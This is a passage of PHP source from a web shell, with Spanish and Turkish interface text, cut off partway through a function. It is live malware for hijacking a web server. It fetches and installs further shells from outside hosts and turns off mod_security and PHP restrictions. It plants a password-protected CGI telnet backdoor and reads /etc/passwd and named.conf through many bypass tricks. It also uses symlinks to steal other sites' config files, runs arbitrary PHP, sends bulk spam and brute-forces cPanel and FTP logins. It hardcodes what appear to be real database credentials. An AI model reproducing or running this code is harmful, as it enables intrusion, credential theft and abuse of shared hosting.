        $rm_dir = rm_items_pwn(realpath($_GET['d1r'] . '/'));
        if ($rm_dir) {
            echo '<b><font color="green">' . $lenguaje[68] . '! -> ' . htmlentities(stripslashes($_GET['d1r'])) . '</font></b><br /><br />';
        } else {
            echo '<b><font color="red">Err0r !!! -> ' . htmlentities(stripslashes($_GET['d1r'])) . '</font></b><br /<br />';
        }
        listar_archivos($dir);
    } else {
        echo $lenguaje[88] . ' <font color="red"><b>' . htmlentities(stripslashes($_GET['d1r'])) . '</b></font> ?<br />
		<form action="" method="POST">
		<input type="hidden" name="rm_ok" value="1">
		<br />
		<input type="submit" value="SI">
		<form>
		<br /><br />';
    }
} elseif (('rm_file' == $id_menu) && ('' == !trim($_GET['fil3']))) {
    if ((isset($_POST['rm_ok'])) && (1 == $_POST['rm_ok'])) {
        $unlink_fil3 = @unlink($_GET['fil3']);
        if ($unlink_fil3) {
            echo '<b><font color="green">' . $lenguaje[69] . '! -> ' . htmlentities(stripslashes($_GET['fil3'])) . '</font></b><br /><br />';
        } else {
            echo '<b><font color="red">Err0r !!!  -> ' . htmlentities(stripslashes($_GET['fil3'])) . '</font></b><br /><br />';
        }
        listar_archivos($dir);
    } else {
        echo $lenguaje[87] . ' <font color="red"><b>' . htmlentities(stripslashes($_GET['fil3'])) . '</b></font> ?<br /><form action="" method="POST">
		<input type="hidden" name="rm_ok" value="1">
		<br />
		<input type="submit" value="SI">
		<form>
		<br /><br />';
    }
} elseif (('mkdir' == $id_menu) && ('' == !trim($_GET['d']))) {
    if (isset($_POST['dir_name'])) {
        $mkdir_f = @mkdir($dir . '/' . trim($_POST['dir_name']));
        if ($mkdir_f) {
            echo '<b><font color="green">' . $lenguaje[70] . '! -> ' . htmlentities($_POST['dir_name']) . '</font></b><br /><br />';
        } else {
            echo '<b><font color="red">Err0r !!!</font></b><br /><br />';
        }
    } else {
        echo '<form method="post" action="">
		 <table width="214" border="0" cellspacing="0" cellpadding="0">
		 <tr valign="top">
		 <td width="58" height="30">' . $lenguaje[71] . ': </td>
		 <td width="144"><input type="text" name="dir_name" /></td>
		 </tr>
		 <tr valign="top" align="center">
		 <td colspan="2"><input type="submit" value="' . $lenguaje[72] . '" /></td>
		 </tr>
		 </table>
		 </form>';
    }
    listar_archivos($dir);
} elseif (('mkfile' == $id_menu) && (isset($_GET['d']))) {
    if (isset($_POST['fil3_name'])) {
        $fopen = @fopen($dir . '/' . $_POST['fil3_name'], 'w+');
        @fwrite($fopen, stripslashes($_POST['fil3_content']));
        @fclose($fopen);
        if ($fopen) {
            echo '<b><font color="green">' . $lenguaje[73] . '! -> ' . htmlentities($_POST['fil3_name']) . '</font></b><br /><br />';
        } else {
            echo '<b><font color="red">Err0r!!!</font></b><br /><br />';
        }
        listar_archivos($dir);
    } else {
        echo '<form method="post" action="">
		 <table border="0" cellspacing="0" cellpadding="0">
		 <tr valign="top">
		 <td height="30">' . $lenguaje[74] . ': </td>
		 <td width="140"> 
		 <input type="text" name="fil3_name" />
		 </td>
		 </tr>
		 <tr valign="top" align="center">
		 <td colspan="2"><input type="submit" value="' . $lenguaje[75] . '" /></td>
		 </tr>
		 </table> 
		 <br />
		 <textarea name="fil3_content" cols="80" rows="12"></textarea>
		 </form>';
    }
} elseif (('fdown' == $id_menu) && ('' == !trim($_GET['fil3_down']))) {
    if ('' == !trim($_GET['fil3_path'])) {
        $fil3_down = str_replace(' ', '_', $_GET['fil3_down']);
        $fil3_path = $_GET['fil3_path'];
        $fp = @fopen($fil3_path, 'rb');
        header('Content-Disposition: attachment; filename=' . $fil3_down);
        header('Content-Length: ' . filesize($fil3_path));
        fpassthru($fp);
        @fclose($fp);
    } else {
        $homedir = getcwd();
        $dir = realpath($_GET['d']);
        css();
        header_index();
        echo $lenguaje[76] . ' <br /> <br />';
        echo '<a href="' . $_SERVER['SCRIPT_NAME'] . '">' . $lenguaje[77] . '</a>';
    }
}
if ('log_mysql' == $id_menu) {
    if (('' == !$_GET['userm']) && ('' == !$_GET['hostm'])) {
        if (post_form_mysql($_GET['hostm'], $_GET['userm'], $_GET['passm'])) {
            echo '<div align="center">' . $lenguaje[78] . ': <br /><br />
			 <a href="?id=listar_dbs&userm=' . base64_encode($_GET['userm']) . '&passm=' . base64_encode($_GET['passm']) . '&hostm=' . base64_encode($_GET['hostm']) . '">' . $lenguaje[79] . '</a><br />
			 <a href="?">' . $lenguaje[80] . '</a></div>';
        } else {
            echo $lenguaje[81];
        }
    } else {
        echo 'Error<br />';
    }
} elseif ('listar_dbs' == $id_menu) {
    if (post_form_mysql($hostm, $userm, $passm)) {
        listar_dbs();
    } else {
        echo $lenguaje[81];
    }
} elseif ('list_tb' == $id_menu) {
    if (post_form_mysql($hostm, $userm, $passm)) {
        listar_tbs($_GET['dbname']);
    } else {
        echo $lenguaje[81];
    }
} elseif (('ver_schema' == $id_menu) && ('' == !$_GET['tbname']) && ('' == !$_GET['db'])) {
    if (post_form_mysql($hostm, $userm, $passm)) {
        ver_schema($_GET['tbname'], $_GET['db']);
    } else {
        echo $lenguaje[81];
    }
} elseif (('mostrar_datos' == $id_menu) && ('' == !$_GET['tbname'])) {
    if (post_form_mysql($hostm, $userm, $passm)) {
        echo '<a href="?id=list_tb&userm=' . htmlspecialchars($_GET['userm']) . '&passm=' . htmlspecialchars($_GET['passm']) . '&hostm=' . htmlspecialchars($_GET['hostm']) . '&dbname=' . htmlspecialchars($_GET['db']) . '">' . $lenguaje[25] . '</a><br /><br />';
        $paginaz = $_GET[pag];
        if ('' == trim($paginaz)) {
            $paginaz = 0;
        }
        if (is_numeric($paginaz)) {
            paginar($_GET['tbname'], $_GET['db']);
            echo '<br />';
            mostrar_datos($_GET['tbname'], $_GET['db'], $paginaz, 30);
        }
    } else {
        echo $lenguaje[81];
    }
} elseif (('dump3r' == $id_menu) && (isset($_GET['db']))) {
    if (isset($_GET['tablename'])) {
        dump3r($userm, $passm, $hostm, $_GET['db'], $_GET['tablename']);
    } else {
        dump3r($userm, $passm, $hostm, $_GET['db'], '');
    }
} elseif (('drop_db' == $id_menu) && ('' == !$_GET['dbname'])) {
    if (post_form_mysql($hostm, $userm, $passm)) {
        drop_db($_GET['dbname']);
    } else {
        echo $lenguaje[81];
    }
} elseif (('drop_tb' == $id_menu) && ('' == !$_GET['dbname']) && ('' == !$_GET['tbname'])) {
    if (post_form_mysql($hostm, $userm, $passm)) {
        drop_tb($_GET['tbname'], $_GET['tbname']);
    } else {
        echo $lenguaje[81];
    }
} elseif ('mysql_login' == $id_menu) {
    login_form_mysql();
} elseif ('mail3r' == $id_menu) {
    if (!$_POST) {
        form_mailer();
    } else {
        form_mailer();
        $paratal_emails = split("\n", $_POST['maillist']);
        $count_emails = count($paratal_emails);
        for ($x = 0; $x < $count_emails; ++$x) {
            $para = $paratal_emails[$x];
            if ($para) {
                $contenido = ereg_replace('&email&', $para, $_POST['contenido']);
                $titulo = ereg_replace('&email&', $para, $_POST['titulo']);
                $header = "From: $_POST[nombre] <$_POST[email]>\r\n";
                $header .= "MIME-Version: 1.0\r\n";
                $header .= "Content-Type: text/html\r\n";
                $header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";
                $header .= "$contenido\r\n";
                if (mail($para, $titulo, '', $header)) {
                    echo '<b>' . $para . '</b> -->> ' . $lenguaje[82] . '<br />';
                } else {
                    echo '<b>' . $para . '</b> -->> ' . $lenguaje[83] . '<br />';
                }
            }
            flush();
            ob_flush();
        }
        echo 'Fin :D';
    }
} elseif ('crawl3r' == $id_menu) {
    crawl3r();
} elseif ('checkbox_form' == $id_menu) {
    if ('borrar' == $_POST['menu_dirs']) {
        if ((isset($_POST['directorios_confirmados'])) or (isset($_POST['archivos_confirmados'])) or (isset($_POST['directorios'])) or (isset($_POST['archivos']))) {
            @borrrar_checkbox(realpath($_POST['dir']), $_POST['directorios'], $_POST['archivos']);
        } else {
            echo $lenguaje[95] . '<br /><br />';
        }
    }
} elseif (('pwn_chmod' == $id_menu) && (isset($_GET['pwnd']))) {
    pwn_chmod($_GET['pwnd']);
} elseif ('reverse_dns' == $id_menu) {
    reverse_dns();
}
if (('phpinfo' != $id_menu) && ('fdown' != $id_menu) && ('dump3r' != $id_menu) && ('proxy' != $id_menu)) {
    echo '<br />

	 </div>';
}
if ('info' == $_GET[id]) {
    phpinfo();
}
if ('phpini' == $_GET[id]) {
    $File = 'php.ini';
    $Handle = fopen($File, 'w');
    $Data = "safe_mode = off\n";
    fwrite($Handle, $Data);
    $Data = "disable_functions = NONE\n";
    fwrite($Handle, $Data);
    echo 'Ba�ar�l�!!';
    fclose($Handle);
}
if ('get' == $_GET[id]) {
    $file = file_get_contents('http://kordonfilm.com/priv/Siyanur5xFull.txt');
    $b = fopen('Siyanur5x.php', 'w');
    fwrite($b, $file);
    fclose($b);
    echo 'Ba�ar�l� ! <a href=Siyanur5x.php></a>';
}
if ('angel' == $_GET[id]) {
    $file = file_get_contents('http://kordonfilm.com/priv/4ngel.txt');
    $b = fopen('angel.php', 'w');
    fwrite($b, $file);
    fclose($b);
    echo 'Ba�ar�l� ! <a href=angel.php></a>';
}
if ('passwd' == $_GET[id]) {
    $output = shell_exec('cat /etc/passwd > passwd.txt');
    echo 'Ba�ar�l� ! <a href=passwd.txt>passwd.txt</a>';
}
if ('usr' == $_GET[id]) {
    $output = shell_exec('ls /var/mail > users.txt');
    echo 'Ba�ar�l� ! <a href=users.txt>users.txt</a>';
}
if ('hta' == $_GET[id]) {
    $File = '.htaccess';
    $Handle = fopen($File, 'w+');
    $Data = '<IfModule mod_security.c>
FucKFilterEngine Off
FucKFilterScanPOST Off
FucKFilterCheckURLEncoding Off
FucKFilterCheckUnicodeEncoding Off
</IfModule>';
    fwrite($Handle, $Data);
    echo 'Ba�ar�l�!!';
    fclose($Handle);
}
if ('cgitelnet' == $_GET[id]) {
    $kokdosya = '.htaccess';
    $dosya_adi = "$kokdosya";
    $dosya = fopen($dosya_adi, 'w') or die('Dosya a��lamad�!');
    $metin = 'Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-cgi .truy
AddHandler cgi-script .truy
AddHandler cgi-script .truy';
    fwrite($dosya, $metin);
    fclose($dosya);
    $file = fopen('mectruy.truy', 'w+');
    $sa = file_get_contents('http://firmareklam.net/box/cgitelnet.txt');
    $write = fwrite($file, $sa);
    fclose($file);
    if ($write) {
        echo "<b><a href='mectruy.truy'>mectruy.truy</a></b> ad�nda Cgitelnet olu�turuldu.<br>.htaccess .truy uzant�ya destek verecek �ekilde d�zenlendi<br>Telnet giri� �ifresi<b><font color=red>mectruy</font></b></br>";
    } else {
        echo'"error"';
    }
    $chm = chmod('mectruy.truy', 0755);
    if (true == $chm) {
        echo 'Chmod 755 olarak ayarland�';
    } else {
        echo 'chmod verilemedi';
    }
}
if ('tmplink' == $_GET[id]) {
    mkdir('abc');
    chdir('abc');
    mkdir('etc');
    chdir('etc');
    mkdir('passwd');
    chdir('..');
    mkdir('abc');
    chdir('abc');
    mkdir('abc');
    chdir('abc');
    mkdir('abc');
    chdir('abc');
    chdir('..');
    chdir('..');
    chdir('..');
    chdir('..');
    symlink('abc/abc/abc/abc', 'tmplink');
    symlink('tmplink/../../../etc/passwd', 'exploit');
    unlink('tmplink');
    mkdir('tmplink');
    echo 'Tmplink olu�turuldu <a href=tmplink>tmplink</a> - <a href=abc>abc</a>';
}
if ('php44' == $_GET[id]) {
    if ('php4' == $_GET[id]) {
    } else {
        $action = '?a=php4';
        echo "<html> 
<br> 
<head> 
<meta http-equiv='pragma' content='no-cache'> 
</head><body>";
        $r1s = fopen('.htaccess', 'w+');
        fwrite($r1s, '<Files *.php> 
   ForceType application/x-httpd-php4 
</Files>');
        echo '<b>sistem �uanda PHP4</b><br>';
        exit;
    }
}
if ('perm' == $_GET[id]) {
    @mkdir('anjiyo');
    @chdir('anjiyo');
    @exec('curl http://kordonfilm.com/priv/ln.zip -o ln.zip');
    @exec('unzip ln.zip');
    @exec('chmod 755 ln');
    echo '<font color=green>[+] Dizin [ anjiyo ] ad�yla olu�turuldu .</font><Br>';
    echo '<font color=green>[+] Dizin de�i�tirildi .</font><Br>';
    $file3 = 'Options Indexes FollowSymLinks
DirectoryIndex ssssss.htm
AddType txt .php
AddHandler txt .php';
    $fp3 = fopen('.htaccess', 'w');
    $fw3 = fwrite($fp3, $file3);
    if ($fw3) {
        echo '<font color=green>[+] .htaccess y�klendi .</font><BR>';
    } else {
        echo '<font color=red>[+] Permission izin vermiyor .htaccess olu�turulamad� !</font><BR>';
    }
    @fclose($fp3);
    $lines3 = @file('/etc/passwd');
    if (!$lines3) {
        $authp = @popen('/bin/cat /etc/passwd', 'r');
        $i = 0;
        while (!feof($authp)) {
            $aSonu�[$i++] = fgets($authp, 4096);
        }
        $lines3 = $aSonu�;
        @pclose($authp);
    }
    if (!$lines3) {
        echo "<font color=red>[+] Can't Read /etc/passwd File .</font><BR>";
        echo "<font color=red>[+] Can't Make The Users Shortcuts .</font><BR>";
        echo '<font color=red>[+] Finish !</font><BR>';
    } else {
        foreach ($lines3 as $line_num3 => $line3) {
            $sprt3 = explode(':', $line3);
            $user3 = $sprt3[0];
            @exec('./ln -s /home/' . $user3 . '/public_html ' . $user3);
        }
        echo '<font color=green>[+] Users Shortcut Created .</font><BR>';
        echo '<font color=green>[+] Finish !</font><BR>';
    }
}
if ('namedbypass' == $_GET[id]) {
    $conf['groups'] = 1;
    $conf['accounts'] = [];
    $MySQL['host'] = '94.73.146.248';
    $MySQL['user'] = 'cihaz';
    $MySQL['pass'] = '00235154';
    $MySQL['db'] = 'paketleme';
    $IsCallableExt = create_function('$ext', '
// function IsCallableExt($ext)
// {
	echo "Deneniyor via {$ext} extension...";

	// Check whether this extension can be used
	if ( @extension_loaded($ext) )
	{
		echo "extension loaded, Deneniyor...";
		$ext = 1; // YAY, it has already been enabled!
	}
	else
	{
		echo "extension is off. Deneniyor to load {$ext} extension...";

		// We must try to enable it!
		if ( is_callable("dl") )
		{
			@dl((PHP_SHLIB_SUFFIX === "dll" ? "php_" : "").$ext.".".PHP_SHLIB_SUFFIX);
		}

		// Check whether it worked
		if ( @extension_loaded("posix") )
		{
			$ext = 1; // YAY, it worked!
		}
	}
// }
');
    @ini_restore('safe_mode');
    @ini_set('safe_mode', 0);
    @ini_restore('open_basedir');
    @ini_set('open_basedir', '');
    @ini_restore('disable_functions');
    @ini_set('disable_functions', '');
    if (is_callable('ini_get') && ini_get('error_reporting')) {
        $conf['safe_mode'] = ini_get('safe_mode');
    }
    echo 'Safe-Mode is ' . ($conf['safe_mode'] ? 'on' : 'off') . "<br />\r\n";
    echo 'Deneniyor via backtick operator...';
    if (!$conf['safe_mode']) {
        $passwd = `cat /etc/named.conf`;
        if ($passwd) {
            die("DONE!<br /><br /><br /><br />\r\n" . nl2br($passwd));
        }
    }
    echo "failed.<br />\r\nDeneniyor via system()...";
    $x = '';
    if (@system('ls', $x)) {
        system('cat /etc/named.conf', $passwd);
        if ($passwd) {
            die("DONE!<br /><br /><br /><br />\r\n" . nl2br($passwd));
        }
    }
    echo "failed.<br />\r\nDeneniyor via shell_exec()...";
    if (@shell_exec('ls')) {
        $passwd = shell_exec('cat /etc/named.conf');
        if ($passwd) {
            die("DONE!<br /><br /><br /><br />\r\n" . nl2br($passwd));
        }
    }
    echo "failed.<br />\r\nDeneniyor via readfile()...";
    if (@readfile('/etc/named.conf')) {
        die();
    }
    echo "failed.<br />\r\nDeneniyor via file_get_contents()...";
    if (@is_readable('/etc/named.conf')) {
        $passwd = file_get_contents('/etc/named.conf');
        if ($passwd) {
            die("DONE!<br /><br /><br /><br />\r\n" . nl2br($passwd));
        }
    }
    echo "failed.<br />\r\nDeneniyor via copy()...";
    if (is_callable('copy')) {
        if (@copy('compress.zlib:///etc/named.conf', dirname($_SERVER['SCRIPT_FILENAME']) . '/file.txt')) {
            echo 'go to: ' . dirname($_SERVER['SCRIPT_FILENAME']) . '/file.txt';
        }
    }
    echo "failed.<br />\r\nDeneniyor via CURL...";
    if (is_callable('curl_init') && is_callable('curl_exec')) {
        $passwd = curl_init("file:///etc/named.conf\x00" . __FILE__);
        if (curl_exec($passwd)) {
            var_dump(curl_exec($passwd));
            die();
        }
    }
    echo "failed.<br />\r\n";
    if ($IsCallableExt('posix')) {
        echo "done.<br />\r\nDeneniyor via posix_getpwuid()...";
        if (is_callable('posix_getpwuid')) {
            $passwd = [];
            for ($i = 0; $i < 5000; ++$i) {
                $line = @posix_getpwuid($i);
                if ($line) {
                    $passwd[$i] = $line;
                }
            }
            if (count($passwd)) {
                die(implode("<br />\r\n", $passwd));
            }
        }
        echo "failed.<br />\r\nDeneniyor via posix_getgrgid()...";
        if ($conf['groups'] && is_callable('posix_getgrgid')) {
            $passwd = [];
            for ($i = 0; $i < 5000; ++$i) {
                $line = @posix_getgrgid($i);
                if ($line) {
                    $passwd[$i] = $line;
                }
            }
            if (count($passwd)) {
                die(implode("<br />\r\n", $passwd));
            }
        }
        echo "failed.<br />\r\nDeneniyor via posix_getpwnam()...";
        if (is_callable('posix_getpwnam')) {
            $passwd = [];
            foreach ($conf['accounts'] as $account) {
                $passwd[$account] = posix_getpwnam($account);
            }
            if (count($passwd)) {
                die(implode("<br />\r\n", $passwd));
            }
        }
        echo "failed.<br />\r\nDeneniyor via posix_getgrnam()...";
        if ($conf['groups'] && is_callable('posix_getgrnam')) {
            $passwd = [];
            foreach ($conf['accounts'] as $account) {
                $passwd[$account] = posix_getgrnam($account);
            }
            if (count($passwd)) {
                die(implode("<br />\r\n", $passwd));
            }
        }
    }
    echo "failed.<br />\r\n";
    echo 'Deneniyor via MySQL (LOCAL-INFILE)...';
    if ($MySQL['host'] && $MySQL['user'] && $MySQL['pass'] && $MySQL['db']) {
        mysql_connect($MySQL['host'], $MySQL['user'], $MySQL['pass']);
        mysql_select_db($MySQL['db']);
        mysql_query('CREATE TABLE adskfjlsdjf (a varchar(1024))');
        mysql_query("LOAD DATA LOCAL INFILE '/etc/named.conf' INTO TABLE adskfjlsdjf");
        $Query = mysql_query('SELECT a FROM adskfjlsdjf');
        if (mysql_num_rows($Query)) {
            while ($Row = mysql_fetch_row($Query)) {
                echo implode('', $Row) . "\r\n<br />";
            }
            die();
        }
    }
    echo "failed.<br />\r\n";
    if ($IsCallableExt('perl')) {
        $perl = new perl();
        die($perl->eval("system('cat /etc/named.conf')"));
    }
    echo "failed.<br />\r\n";
    if ($IsCallableExt('ionCube Loader')) {
        $passwd = @ioncube_read_file('/etc/named.conf');
        if ($passwd) {
            die(nl2br($passwd));
        }
    }
    echo "failed.<br />\r\n";
    if ($IsCallableExt('python')) {
        $passwd = python_eval("
import os
pwd = os.getcwd()
print pwd
os.system('cat /etc/named.conf')
");
        if ($passwd) {
            die(nl2br($passwd));
        }
    }
    echo "failed.<br />\r\n";
    echo '<br /><br />
Unable to read /etc/named.conf, nothing worked.<br />';
}
if ('passwd1' == $_GET[id]) {
    for ($uid = 0; $uid < 2000; ++$uid) {
        $nothing = posix_getpwuid($uid);
        if (!empty($nothing)) {
            while (list($key, $val) = each($nothing)) {
                echo "$val:";
            }
            echo '<br />';
        }
    }
}
if ('yukle' == $_GET[id]) {
    echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
    echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
    if ('Upload' == $_POST['_upl']) {
        if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
            echo '<b>Y�kleme ba�ar�l� !!!</b><br><br>';
        } else {
            echo '<b>Y�kleme ba�ar�s�z !!!</b><br><br>';
        }
    }
    echo '<a href=?a=phpini><input type="submit" value="G�venlikleri kapat"></a>';
}
if ('pg' == $_GET[id]) {
    echo '<form method="post" action="">';
    echo '<textarea name="site" cols="60" rows="10"></textarea><br /><input type="submit" value="sorgula">';
    echo '<br>';
    ob_start();
    function StrToNum($Str, $Check, $Magic)
    {
        $Int32Unit = 4294967296;
        $length = strlen($Str);
        for ($i = 0; $i < $length; ++$i) {
            $Check *= $Magic;
            if ($Check >= $Int32Unit) {
                $Check = ($Check - $Int32Unit * (int) ($Check / $Int32Unit));
                $Check = ($Check < -2147483648) ? ($Check + $Int32Unit) : $Check;
            }
            $Check += ord($Str[$i]);
        }

        return $Check;
    }
    function HashURL($String)
    {
        $Check1 = StrToNum($String, 0x1505, 0x21);
        $Check2 = StrToNum($String, 0, 0x1003F);
        $Check1 >>= 2;
        $Check1 = (($Check1 >> 4) & 0x3FFFFC0) | ($Check1 & 0x3F);
        $Check1 = (($Check1 >> 4) & 0x3FFC00) | ($Check1 & 0x3FF);
        $Check1 = (($Check1 >> 4) & 0x3C000) | ($Check1 & 0x3FFF);
        $T1 = (((($Check1 & 0x3C0) << 4) | ($Check1 & 0x3C)) << 2) | ($Check2 & 0xF0F);
        $T2 = (((($Check1 & 0xFFFFC000) << 4) | ($Check1 & 0x3C00)) << 0xA) | ($Check2 & 0xF0F0000);

        return $T1 | $T2;
    }
    function CheckHash($Hashnum)
    {
        $CheckByte = 0;
        $Flag = 0;
        $HashStr = sprintf('%u', $Hashnum);
        $length = strlen($HashStr);
        for ($i = $length - 1; $i >= 0; --$i ) {
            $Re = $HashStr[$i];
            if (1 === ($Flag % 2)) {
                $Re += $Re;
                $Re = (int) ($Re / 10) + ($Re % 10);
            }
            $CheckByte += $Re;
            ++$Flag;
        }
        $CheckByte %= 10;
        if (0 !== $CheckByte) {
            $CheckByte = 10 - $CheckByte;
            if (1 === ($Flag % 2)) {
                if (1 === ($CheckByte % 2)) {
                    $CheckByte += 9;
                }
                $CheckByte >>= 1;
            }
        }

        return '7' . $CheckByte . $HashStr;
    }
    function getpagerank($url)
    {
        $query = 'http://toolbarqueries.google.com/tbr?client=navclient-auto&hl=en&ch=' . CheckHash(HashURL($url)) . '&features=Rank&q=info:' . $url . '&num=100&filter=0';
        $data = file_get_contents_curl($query);
        $pos = strpos($data, 'Rank_');
        if (false === $pos) {
        } else {
            $pagerank = substr($data, $pos + 9);

            return $pagerank;
        }
    }
    function file_get_contents_curl($url)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, $url);
        $data = curl_exec($ch);
        curl_close($ch);

        return $data;
    }
    if ('' == !$_POST['site']) {
        $site = explode("\n", $_POST['site']);
        foreach ($site as $sites) {
            $sites = trim($sites);
            $pr = getPageRank($sites);
            echo $sites . ' => <b>' . $pr . '</b><br />';
            ob_flush();
            flush();
        }
    }
}
if ('eval' == $_GET[id]) {
    $code = stripslashes($_POST['code']);
    echo '<center><br><h3> Eval PHP(asl�nda en etkili bypass methodlar�ndan birisidir) </h3></center>
	<center>
	<form method="POST" action="">
	<input type="hidden" name="id" value="eval">
	<textarea name ="code" rows="10" cols="85" class="textarea">',$code,'
chdir("file:");
chdir("etc");
chdir("..");
chdir("..");

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "file:file:///etc/passwd");
curl_setopt($ch, CURLOPT_HEADER, 0);

curl_exec($ch);

curl_close($ch);</textarea><br><br>
	<input type="submit" value=" Evaluate PHP Code" class="button"><hr>
	</form>
	<textarea rows="10" cols="85" class="textarea">';
    eval($code);
    echo '</textarea><br><br>';
}
if ('symlist' == $_GET[id]) {
    $mk = @mkdir('sym', 0777);
    $htcs = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
    $f = @fopen('sym/.htaccess', 'w');
    @fwrite($f, $htcs);
    $sym = @symlink('/', 'sym/root');
    $pg = basename(__FILE__);
    $d00m = @file('/etc/named.conf');
    if (!$d00m) {
        die(' <br><br><center><b>named.conf</b> Dosyas� okunam�yor Manuel symlink deneyiniz</center>');
    } else {
        echo "<div class='tmp'><table align='center' width='40%'><td>Domainler</td><td>Users</td><td>symlink </td>";
        foreach ($d00m as $dom) {
            if (eregi('zone', $dom)) {
                preg_match_all('#zone "(.*)"#', $dom, $domsws);
                flush();
                if (strlen(trim($domsws[1][0])) > 2) {
                    $user = posix_getpwuid(@fileowner('/etc/valiases/' . $domsws[1][0]));
                    $site = $user['name'];
                    @symlink('/', 'sym/root');
                    $site = $domsws[1][0];
                    $ir = 'ir';
                    $il = 'il';
                    if (preg_match("/.^$ir/", $domsws[1][0]) or preg_match("/.^$il/", $domsws[1][0])) {
                        $site = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>" . $domsws[1][0] . '</div>';
                    }
                    echo "
<tr>

<td>
<div class='dom'><a target='_blank' href=http://www." . $domsws[1][0] . '/>' . $site . ' </a> </div>
</td>


<td>
' . $user['name'] . "
</td>


<td>
<a href='sym/root/home/" . $user['name'] . "/public_html' target='_blank'>symlink </a>
</td>


</tr></div> ";
                    flush();
                }
            }
        }
    }
} else {
    $pfile = $_POST['file'];
    $symfile = $_POST['symfile'];
    $symlink = $_POST['symlink'];
    if ($symlink) {
        @symlink("$pfile", "sym/$symfile");
        echo '<br /><a target="_blank" href="sym/' . $symfile . '" >' . $symfile . '</a>';
        exit;
    }
}
if ('manuelsym' == $_GET[id]) {
    echo '
Manuel Symlink b�l�m�

<br /><br />
<form method="post">
<input type="text" name="file" value="/home/user/public_html/config.php" size="60"/><br /><br />
<input type="text" name="symfile" value="siyanur5x.txt" size="60"/><br /><br />
<input type="submit" value="symlink �ek" name="symlink" /> <br /><br />



</form>
';
    $pfile = $_POST['file'];
    $symfile = $_POST['symfile'];
    $symlink = $_POST['symlink'];
    if ($symlink) {
        @symlink("$pfile", "sym/$symfile");
        echo '<br /><a target="_blank" href="sym/' . $symfile . '" >' . $symfile . '</a>';
        exit;
    }
}
if ('cpanel' == $_GET[id]) {
    @ini_set('memory_limit', 1000000000000);
    $connect_timeout = 5;
    @set_time_limit(0);
    $submit = $_REQUEST['submit'];
    $users = $_REQUEST['users'];
    $pass = $_REQUEST['passwords'];
    $target = $_REQUEST['target'];
    $option = $_REQUEST['option'];
    $page = $_GET['page'];
    if ('' == $target) {
        $target = 'localhost';
    }
    @ini_set('memory_limit', 1000000000000);
    $connect_timeout = 5;
    @set_time_limit(0);
    $submit = $_REQUEST['submit'];
    $users = $_REQUEST['users'];
    $pass = $_REQUEST['passwords'];
    $target = $_REQUEST['target'];
    $option = $_REQUEST['option'];
    if ('' == $target) {
        $target = 'localhost';
    }
    echo " <div align='center'>
<form method='post' style='border: 1px solid #000000'><br><br>
<TABLE style='BORDER-COLLAPSE: collapse' cellSpacing=0  cellPadding=0 width='40%' borderColorLight=#666666 border=0><tr><td>
<b> Host  : </font><input type='text' name='target' size='16' value= $target style='border: font-family:Tahoma; font-weight:bold;'></p></font></b></p>
<div align='center'><br>
<TABLE style='BORDER-COLLAPSE: collapse' cellSpacing=0  cellPadding=0 width='50%'  borderColorLight=#666666 border=0>
<tr>
<center>
<b>Kullan�c� adlar�</b></center>


</tr>
</table>
<p align='center'>
<textarea rows='20' name='users' cols='25' style='border: 2px solid #1D1D1D; '>$users</textarea>

<center><b>�ifre listesi</b></center>
<textarea rows='20' name='passwords' cols='25' style='border: 2px solid #1D1D1D;'>$pass</textarea><br>
<br>                         
<b>Options : </span><input name='option' value='cpanel' style='font-weight: 700;' checked type='radio'> cPanel 
<input name='option' value='ftp' style='font-weight: 700;' type='radio'> ftp    <input type='submit' value='K�rmaya ba�la' name='submit' ></p>
</td></tr></table></td></tr></form><p align= 'left'>";
    function ftp_check($host, $user, $pass, $timeout)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "ftp://$host");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
        curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);
        curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_FAILONERROR, 1);
        $data = curl_exec($ch);
        if (28 == curl_errno($ch)) {
            echo '<b> Hata : S�re d��� kald�n , tekrar dene !</b>';
            exit;
        } elseif (0 == curl_errno($ch)) {
            echo
"<b>[ user@aria-security.com ]# </b>
<b> Sald�r� ba�ar�l� , bulunan kullan�c� ad� , <font color='#FF0000'> $user </font> ve �ifre , 
<font color='#FF0000'> $pass </font></b><br>";
        }
        curl_close($ch);
    }
    function cpanel_check($host, $user, $pass, $timeout)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://$host:2082");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
        curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_FAILONERROR, 1);
        $data = curl_exec($ch);
        if (28 == curl_errno($ch)) {
            echo '<b> Error : Connection timed out , make confidence about validation of target !</b>';
            exit;
        } elseif (0 == curl_errno($ch)) {
            echo
"
<b> Sald�r� ba�ar�l� , bulunan kullan�c� ad� , <font color='#FF0000'> $user </font> ve �ifre , 
<font color='#FF0000'> $pass </font></b><br>";
        }
        curl_close($ch);
    }
    if (isset($submit) && !empty($submit)) {
        $userlist = explode("\n", $users);
        $passlist = explode("\n", $pass);
        echo '<b> Sald�r� ba�lad� ...</font></b><br>';
        foreach ($userlist as $user) {
            $_user = trim($user);
            foreach ($passlist as $password) {
                $_pass = trim($password);
                if ('ftp' == $option) {
                    ftp_check($target, $_user, $_pass, $connect_timeout);
                }
